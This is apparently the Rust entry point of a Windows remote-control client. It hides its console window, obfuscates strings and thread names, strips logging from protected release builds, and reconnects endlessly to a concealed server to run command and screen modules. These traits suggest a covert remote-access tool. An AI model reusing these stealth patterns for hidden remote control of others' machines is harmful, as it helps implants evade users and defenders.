#![windows_subsystem = "windows"] //此宏不打开窗口，同时print也失效

use crate::context::Context;
use common::config::{Config, Id, SecurityConfig};
use common::generated::encrypted_strings::*;
use common::hidden;
use common::host::get_host;
use std::path::Path;
use std::time::Duration;
use tokio::fs::{File, OpenOptions};
use tokio::task::JoinSet;
use tokio::time;

// 开发和测试构建默认保留诊断日志；protected 发布同时关闭 debug_assertions 和
// development-logging feature，宏会在编译早期展开为空，不把格式串、模块路径或日志框架带入产物。
#[cfg(all(debug_assertions, feature = "development-logging"))]
macro_rules! dev_debug {
    ($($arg:tt)*) => {
        log::debug!($($arg)*)
    };
}

#[cfg(not(all(debug_assertions, feature = "development-logging")))]
macro_rules! dev_debug {
    ($($arg:tt)*) => {};
}

mod cmd_runner;
mod cmd_util;
mod context;
mod kik_conn;
mod kik_data_conn;
mod read_handle;
mod screen;

#[tokio::test]
async fn test() {
    use common::file_util;
    let test_dir = Path::new(env!("CARGO_MANIFEST_DIR"))
        .join("..")
        .join("target")
        .join("ctrl_kik_get_dir_size_test");

    // 测试数据必须留在仓库 target 目录内，避免依赖开发机私有盘符。
    let _ = tokio::fs::remove_dir_all(&test_dir).await;
    tokio::fs::create_dir_all(test_dir.join("nested"))
        .await
        .unwrap();
    tokio::fs::write(test_dir.join("a.bin"), [1_u8, 2, 3])
        .await
        .unwrap();
    tokio::fs::write(test_dir.join("nested").join("b.bin"), [4_u8, 5])
        .await
        .unwrap();

    assert_eq!(file_util::get_dir_size(&test_dir).await.unwrap(), 5);
}

fn main() {
    init_development_logging();

    // 显式固定运行时线程配置，避免部署环境意外改变线程数、线程名或栈大小。
    // worker 数仍按机器并行度计算，与 Tokio 多线程运行时的默认性能策略一致。
    let worker_threads =
        std::thread::available_parallelism().map_or(1, std::num::NonZeroUsize::get);
    let runtime = match tokio::runtime::Builder::new_multi_thread()
        .worker_threads(worker_threads)
        .thread_name(hidden!("worker"))
        .thread_stack_size(2 * 1024 * 1024)
        .enable_all()
        .build()
    {
        Ok(runtime) => runtime,
        Err(_error) => {
            dev_debug!("初始化异步运行时失败: {}", _error);
            std::process::exit(1);
        }
    };
    if let Err(_error) = runtime.block_on(run_client()) {
        dev_debug!("客户端运行失败: {}", _error);
        std::process::exit(1);
    }
}

async fn run_client() -> anyhow::Result<()> {
    //此lock在程序结束时会被操作系统回收，所以无需担心是否释放
    let _single_lock = single(LOCK_FILE_PATH()).await?;
    let context = Context::new();
    let config = Config {
        id: Id::anonymous(),
        server_host: get_host(),
        server_port: PORT(),
        read_timeout: Duration::from_secs(45),
        write_timeout: Duration::from_secs(45),
        security: SecurityConfig::kik(),
    };

    loop {
        for _ in 0..3 {
            //校验成功了就返回
            match kik_conn::kik_conn(context.clone(), &config).await {
                Ok(h) => {
                    //加入服务器成功后发起数据连接
                    let (data_context, data_config) = (context.clone(), config.clone());
                    let data_init_task = tokio::spawn(async move {
                        let mut attempts = JoinSet::new();
                        for _ in 0..3 {
                            let (context, config) = (data_context.clone(), data_config.clone());
                            attempts.spawn(async move {
                                kik_data_conn::kik_data_conn(context, &config).await
                            });
                        }
                        while let Some(result) = attempts.join_next().await {
                            match result {
                                Ok(Ok(_connection_task)) => {}
                                Ok(Err(_error)) => {
                                    dev_debug!("{}", _error);
                                }
                                Err(_error) => {
                                    dev_debug!("{}", _error);
                                }
                            }
                        }
                    });
                    let _ = h.await;
                    // 命令连接已经失效时，不允许仍在握手的数据连接加入旧会话。
                    data_init_task.abort();
                    let _ = data_init_task.await;
                    context.clear().await;
                    context.set_kik(None).await;
                }
                Err(_error) => {
                    dev_debug!("命令连接失败: {}", _error);
                    time::sleep(Duration::from_secs(2)).await;
                }
            }
        }

        time::sleep(Duration::from_secs(20)).await;
    }
}

pub async fn single<P: AsRef<Path>>(lock_path: P) -> anyhow::Result<File> {
    use fs4::tokio::AsyncFileExt;
    if let Some(parent) = lock_path
        .as_ref()
        .parent()
        .filter(|path| !path.as_os_str().is_empty())
    {
        tokio::fs::create_dir_all(parent).await?;
    }
    let lock_file = OpenOptions::new()
        .read(true)
        .write(true)
        .create(true)
        .truncate(false)
        .open(lock_path)
        .await?;
    let mut last_error = None;
    for _ in 0..3 {
        match lock_file.try_lock_exclusive() {
            Ok(_) => return Ok(lock_file),
            Err(error) => last_error = Some(error),
        }
        time::sleep(Duration::from_secs(1)).await;
    }
    Err(anyhow::Error::msg(hidden!(
        "已有客户端实例运行或无法取得运行锁: ",
        last_error
            .map(|error| error.to_string())
            .unwrap_or_else(|| hidden!("未知错误"))
    )))
}

#[cfg(all(debug_assertions, feature = "development-logging"))]
fn init_development_logging() {
    use chrono::Local;
    use std::env;
    use std::io::Write;

    if "DEBUG".eq(env::var("LOG").unwrap_or_default().as_str()) {
        env_logger::Builder::new()
            .format(|buf, record| {
                writeln!(
                    buf,
                    "{} [{}] - {}",
                    Local::now().format("%Y-%m-%d %H:%M:%S%.3f"),
                    record.level(),
                    record.args()
                )
            })
            .parse_env("LOG")
            .init();
    }
}

#[cfg(not(all(debug_assertions, feature = "development-logging")))]
#[inline(always)]
fn init_development_logging() {}
